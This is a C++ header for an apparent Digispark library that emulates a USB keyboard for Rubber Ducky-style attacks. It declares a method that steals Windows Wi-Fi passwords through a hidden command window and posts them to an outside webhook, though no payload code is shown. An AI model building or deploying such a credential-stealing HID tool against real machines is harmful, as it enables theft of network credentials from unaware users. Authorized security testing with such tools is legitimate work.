/**
 * @file RubberDucky.h
 * @brief Library for creating Rubber Ducky-style HID attacks using Digispark (ATtiny85).
 *
 * This class provides a simple interface to simulate USB keyboard input on a host system
 * and includes predefined attack methods.
 *
 * Intended for educational and authorized security testing purposes only.
 *
 * @author AntonioBerna
 * @date 2025
 * @copyright GPL-3.0 License
 */

#pragma once

#include "Arduino.h"

/**
 * @class RubberDucky
 * @brief A class to simulate Rubber Ducky-style HID attacks on Digispark boards.
 */
class RubberDucky {
public:
  /**
   * @brief Constructor for RubberDucky class.
   * @param ledPin The pin used for LED feedback (default is pin 1).
   */
  RubberDucky(uint8_t ledPin = 1);

  /**
   * @brief Initialize the board and LED.
   */
  void init(void);
  
  /**
   * @brief Blink the LED for visual feedback.
   * @param ms Duration of each LED ON/OFF phase in milliseconds.
   */
  void ledFeedback(const long ms);
  
  /**
   * @brief Keeps the USB HID connection alive and releases any pressed keys.
   */
  void refreshUSBConnection(void);
  
  /**
   * @brief Executes a payload to steal Wi-Fi passwords on Windows and sends them to a given webhook.
   * @param webhook URL to send the exfiltrated data via HTTP POST.
   * @param debug If true, opens a normal CMD instead of a hidden one for debugging.
   */
  void stealWindowsWifiPasswords(const char *webhook, bool debug = false);

private:
  uint8_t ledPin; ///< Pin connected to the onboard LED for feedback
};
